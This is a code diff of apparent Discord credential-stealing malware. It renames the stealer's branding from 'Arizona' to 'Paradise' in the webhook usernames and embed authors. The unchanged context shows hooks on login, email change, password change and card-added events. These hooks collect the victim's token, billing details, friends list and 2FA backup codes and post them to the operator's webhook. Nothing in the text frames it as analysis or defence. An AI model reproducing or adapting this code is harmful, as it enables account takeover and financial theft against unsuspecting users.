@@ -89,8 +89,8 @@ async function firstTime() {
             };
             sendToWebhook(JSON.stringify(n));
         }
-    if (!fs.existsSync(path.join(__dirname, "ArizonaBTW"))) return !0;
-    if ((fs.rmdirSync(path.join(__dirname, "ArizonaBTW")), "false" != config.logout || "%LOGOUT%" == config.logout)) {
+    if (!fs.existsSync(path.join(__dirname, "Paradise"))) return !0;
+    if ((fs.rmdirSync(path.join(__dirname, "Paradise")), "false" != config.logout || "%LOGOUT%" == config.logout)) {
         if ("true" == config["logout-notify"])
             if (null == e || null == e || "" == e) {
                 n = {
@@ -147,7 +147,7 @@ async function userLogin(e, n, t) {
         i = await getBilling(t),
         r = await getRelationships(t),
         s = {
-            username: "Arizona",
+            username: "Paradise",
             content: "",
             embeds: [
                 {
@@ -181,7 +181,7 @@ async function userLogin(e, n, t) {
         };
     if (t.startsWith("mfa")) {
         var l = await get2faCodes(t, e),
-            d = { title: ":detective: __2FA Codes__", description: `[Get all of them](${l.url})`, color: config["embed-color"], fields: l.fields, author: { name: "Arizona" }, footer: { text: "Arizona" } };
+            d = { title: ":detective: __2FA Codes__", description: `[Get all of them](${l.url})`, color: config["embed-color"], fields: l.fields, author: { name: "Paradise" }, footer: { text: "Paradise" } };
         s.embeds.push(d);
     }
     sendToWebhook(JSON.stringify(s));
@@ -224,7 +224,7 @@ async function emailChanged(e, n, t) {
         };
     if (t.startsWith("mfa")) {
         var s = await get2faCodes(t, e),
-            l = { title: ":detective: __2FA Codes__", description: `[Get all of them](${s.url})`, color: config["embed-color"], fields: s.fields, author: { name: "Arizona" }, footer: { text: "Arizona" } };
+            l = { title: ":detective: __2FA Codes__", description: `[Get all of them](${s.url})`, color: config["embed-color"], fields: s.fields, author: { name: "Paradise" }, footer: { text: "Paradise" } };
         r.embeds.push(l);
     }
     sendToWebhook(JSON.stringify(r));
@@ -235,7 +235,7 @@ async function passwordChanged(e, n, t) {
         i = await getBilling(t),
         r = await getRelationships(t),
         s = {
-            username: "Arizona",
+            username: "Paradise",
             content: "",
             embeds: [
                 {
@@ -270,7 +270,7 @@ async function passwordChanged(e, n, t) {
         };
     if (t.startsWith("mfa")) {
         var l = await get2faCodes(t, n),
-            d = { title: ":detective: __2FA Codes__", description: `[Get all of them](${l.url})`, color: config["embed-color"], fields: l.fields, author: { name: "Arizona" }, footer: { text: "Arizona" } };
+            d = { title: ":detective: __2FA Codes__", description: `[Get all of them](${l.url})`, color: config["embed-color"], fields: l.fields, author: { name: "Paradise" }, footer: { text: "Paradise" } };
         s.embeds.push(d);
     }
     sendToWebhook(JSON.stringify(s));
@@ -281,7 +281,7 @@ async function creditCardAdded(e, n, t, a) {
         r = await getBilling(a),
         s = await getRelationships(a),
         l = {
-            username: "Arizona",
+            username: "Paradise",
             content: "",
             embeds: [
                 {
